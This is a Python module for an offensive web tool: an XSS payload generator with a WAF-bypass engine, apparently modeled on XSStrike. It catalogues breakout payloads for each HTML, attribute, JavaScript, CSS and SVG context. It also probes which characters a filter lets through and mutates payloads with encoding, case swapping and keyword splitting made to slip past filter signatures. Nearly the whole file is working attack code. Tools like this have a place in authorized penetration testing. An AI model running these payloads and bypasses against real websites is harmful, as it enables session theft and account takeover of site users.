"""Context-aware XSS payload generator + WAF-bypass engine.

XSStrike workflow, GASH budget: context -> a few high-confidence payloads,
not millions of fuzz strings. Pure functions (no network) so unit tests
stay offline and deterministic.

- ``generate_for_context(context, marker)``: (payload, confidence, note)
  list, capped and deduped. Confidence 0-10 (higher = more likely).
- ``mutate_payload(payload)``: encoding/case/whitespace variants for the
  same breaker (WAF/filter bypass), capped.
- ``filter_probe_strings(marker)``: single-char probes used to learn which
  breaker characters survive (wired to network in P2; pure list here).
- ``efficiency(injected, reflected)``: 0-100 fuzzy survival score for one
  probe (decides whether a filter ate it, and how much).
- ``generate_bypass(context, marker, live_chars)``: payloads whose
  required characters all survived the filter map.
"""

from __future__ import annotations

import base64 as _b64
from difflib import SequenceMatcher
from urllib.parse import quote

# Characters whose survival decides breakout per context. Sent one by one
# (P2) to learn the filter before generating the real payloads.
FILTER_PROBE_CHARS = ["<", ">", '"', "'", "`", "=", "/", "(", ")", ";",
                      "&", "|", "+", "$", "{", "}"]


def filter_probe_strings(marker: str) -> list[str]:
    """One probe per breaker char: ``<marker><char>``. Capped, deduped."""
    m = (marker or "").strip()
    if not m:
        return []
    return [f"{m}{c}" for c in FILTER_PROBE_CHARS]


def efficiency(injected: str, reflected: str | None) -> int:
    """0-100 survival score: how much of the injected string echoes back.

    100 = byte-identical echo (no filter touched it); 0 = fully eaten.
    Case-insensitive partial ratio, stdlib only (no fuzzywuzzy dep).
    """
    if not injected:
        return 0
    if not reflected:
        return 0
    a, b = injected.lower(), reflected.lower()
    if a in b:
        return 100
    try:
        return int(round(SequenceMatcher(None, a, b).ratio() * 100))
    except Exception:
        return 0


# WAFs signature `alert` far more often than its siblings: every
# function-call payload ships in confirm()/prompt() alternates too.
SINK_ALTERNATES = ["alert", "prompt", "confirm"]


def _fn_variants(template: str) -> list[str]:
    """alert(1) -> prompt(1)/confirm(1) copies. Template keeps alert()."""
    if "alert(" not in template:
        return [template]
    return [template] + [template.replace("alert(", f, 1)
                          for f in ("prompt(", "confirm(")]


def _fill_variants(tag_payload: str) -> list[str]:
    """Space <-> %0a/%0d/%09 + / separator variants (filter bypass)."""
    if " " not in tag_payload:
        return [tag_payload]
    return list(dict.fromkeys([
        tag_payload,
        tag_payload.replace(" ", "%0a", 1),
        tag_payload.replace(" ", "/", 1),
    ]))[:3]


def _base_vectors(ctx: str, m: str) -> list[tuple[str, int, str]]:
    """Raw per-context catalogue (no expansion). Pure."""
    out: list[tuple[str, int, str]] = []

    def add(payload: str, conf: int, note: str) -> None:
        out.append((payload, conf, note))

    if ctx == "html-text":
        add(f'{m}"><svg onload=alert(1)>', 9, "attr-breakout+svg")
        add(f'{m}<svg onload=alert(1)>', 7, "tag-injection")
        add(f'{m}</title><svg onload=alert(1)>', 7, "title-breakout")
        add(f'{m}<img src=x onerror=alert(1)>', 8, "img-event")
        add(f'{m}<object data="data:text/html;base64,'
            f"{_b64.b64encode(b'<script>alert(1)</script>').decode()}\">",
            5, "object-base64")
        add(f'{m}<form><math><mtext></form><form><mglyph><style></math>'
            f'<svg onload=alert(1)>', 4, "mXSS-shape")
    elif ctx == "attr-double-quoted":
        add(f'{m}"autofocus/onfocus=alert(1)>', 8, "event-breakout")
        add(f'{m}"><svg onload=alert(1)>', 9, "attr-close+svg")
        add(f'{m}"onmouseover=alert(1)>', 7, "event-breakout")
    elif ctx == "attr-single-quoted":
        add(f"{m}'autofocus/onfocus=alert(1)>", 8, "event-breakout")
        add(f"{m}'><svg onload=alert(1)>", 9, "attr-close+svg")
        add(f"{m}'onmouseover=alert(1)>", 7, "event-breakout")
    elif ctx == "attr-unquoted":
        add(f"{m} autofocus/onfocus=alert(1)>", 8, "event-injection")
        add(f"{m}><svg onload=alert(1)>", 7, "tag-breakout")
    elif ctx == "event-handler":
        add(f"{m});alert(1);//", 7, "js-call-breakout")
        add(f"{m}'+alert(1)+'", 6, "string-concat")
    elif ctx == "url-attr":
        add(f"{m}javascript:alert(1)", 6, "js-url")
        add(f'{m}"javascript:alert(1)', 5, "js-url-breakout")
        add("java%09script:" + f"{m},alert(1)", 4, "js-url-ws-bypass")
    elif ctx == "js-string-single":
        add(f"{m}';alert(1);//", 8, "string-breakout")
        add(f"{m}'-alert(1)-'", 6, "string-concat")
    elif ctx == "js-string-double":
        add(f'{m}";alert(1);//', 8, "string-breakout")
        add(f'{m}"-alert(1)-"', 6, "string-concat")
    elif ctx == "js-template-literal":
        add(f"{m}`;alert(1);//", 7, "template-breakout")
        add(f"{m}${{alert(1)}}", 6, "template-expr")
    elif ctx == "js-expression":
        add(f"{m};alert(1)//", 7, "expr-chain")
        add(f"{m}+(alert(1))+", 5, "expr-concat")
    elif ctx in ("js-template-expression",):
        add(f"{m}}};alert(1);//", 6, "template-expr-breakout")
    elif ctx == "html-comment":
        add(f"{m}--><svg onload=alert(1)>", 8, "comment-breakout")
    elif ctx == "style-css":
        add(f"{m}</style><svg onload=alert(1)>", 7, "style-breakout")
    elif ctx in ("svg-text", "svg-attr-double-quoted", "svg-attr-single-quoted",
                 "svg-attr-unquoted", "svg-attr-double", "svg-attr"):
        add(f'{m}"><svg onload=alert(1)>', 8, "svg-breakout")
        add(f"{m} onload=alert(1)>", 7, "svg-event")
    elif ctx == "json-string":
        add(f'{m}"-alert(1)-"', 5, "json-string-concat")
        add(f"{m}</script><svg onload=alert(1)>", 6, "script-breakout")
    else:  # unknown/fallback -> html-text set
        add(f'{m}"><svg onload=alert(1)>', 8, "attr-breakout+svg")
        add(f'{m}<svg onload=alert(1)>', 6, "tag-injection")
    return out


def _expand_ranked(base: list[tuple[str, int, str]]
                   ) -> list[tuple[str, int, str]]:
    """Whitespace fillings + sink alternates, deduped, confidence order."""
    expanded: list[tuple[str, int, str]] = []
    for payload, conf, note in base:
        variants = [payload]
        if " " in payload and "<" in payload:
            variants = _fill_variants(payload)
        for v in variants:
            c = conf if v == payload else max(3, conf - 1)
            n = note + ("+ws" if v != payload else "")
            expanded.append((v, c, n))
            # WAFs signature alert() hardest: sibling executors included
            for alt in _fn_variants(v)[1:]:
                expanded.append((alt, max(3, c - 1), n + "+alt"))
    # dedupe by payload, keep first (highest confidence), sort desc
    seen: dict[str, tuple[str, int, str]] = {}
    for item in expanded:
        seen.setdefault(item[0], item)
    return sorted(seen.values(), key=lambda t: -t[1])


def generate_for_context(context: str, marker: str) -> list[tuple[str, int, str]]:
    """Payloads for one reflection context. Max 8, deduped, confidence order."""
    m = (marker or "").strip()
    if not m:
        return []
    return _expand_ranked(
        _base_vectors((context or "html-text").lower(), m))[:8]


def _all_ranked(context: str, marker: str) -> list[tuple[str, int, str]]:
    """Full ranked vector list (no cap) for filter-aware selection."""
    m = (marker or "").strip()
    if not m:
        return []
    return _expand_ranked(
        _base_vectors((context or "html-text").lower(), m))


def required_chars(payload: str) -> set[str]:
    """Breaker characters a payload needs to survive the filter."""
    return {c for c in FILTER_PROBE_CHARS if c in (payload or "")}


def generate_bypass(context: str, marker: str,
                    live_chars: set[str]) -> list[tuple[str, int, str]]:
    """Payloads whose required characters all survived the filter map.

    live_chars: chars with efficiency > 50 from the per-char probes.
    Capped at 6, confidence order. Empty live set -> [] (don't guess).
    """
    if not live_chars:
        return []
    try:
        live = set(live_chars)
    except Exception:
        return []
    out = []
    for payload, conf, note in _all_ranked(context, marker):
        if required_chars(payload) <= live:
            out.append((payload, conf, note + "+filterfit"))
        if len(out) >= 6:
            break
    return out


def mutate_payload(payload: str) -> list[str]:
    """Same breaker, different wrappers: raw + URL-encode + case + WS.

    Extra family: WAF keyword-split — `alert%0a(1)` / `prompt%09(1)` /
    `/**/` between function name and parens breaks regex signatures
    (`prompt(` as one string) while the browser still executes.

    Capped at 6, deduped. Deterministic (no randomness -> stable tests).
    """
    if not payload:
        return []
    variants = [payload]
    enc = quote(payload, safe="")
    if enc != payload:
        variants.append(enc)
    # case mutation on the first tag keyword (bypasses naive blocklists)
    low = payload.lower()
    for kw in ("<svg", "<img", "<object", "onload", "onfocus", "onmouseover",
               "onerror", "javascript", "alert"):
        if kw in low:
            i = low.find(kw)
            mutated = payload[:i] + payload[i:i + len(kw)].swapcase() \
                + payload[i + len(kw):]
            if mutated != payload:
                variants.append(mutated)
            break
    # keyword-split: fn%0a(1) defeats `name(` signatures
    for fn in ("alert(", "prompt(", "confirm("):
        if fn in payload:
            variants.append(payload.replace(fn, fn[:-1] + "%0a(", 1))
            variants.append(payload.replace(fn, fn[:-1] + "/**/(", 1))
            break
    if " " in payload:
        ws = payload.replace(" ", "%0d", 1)
        if ws not in variants:
            variants.append(ws)
    return list(dict.fromkeys(variants))[:6]
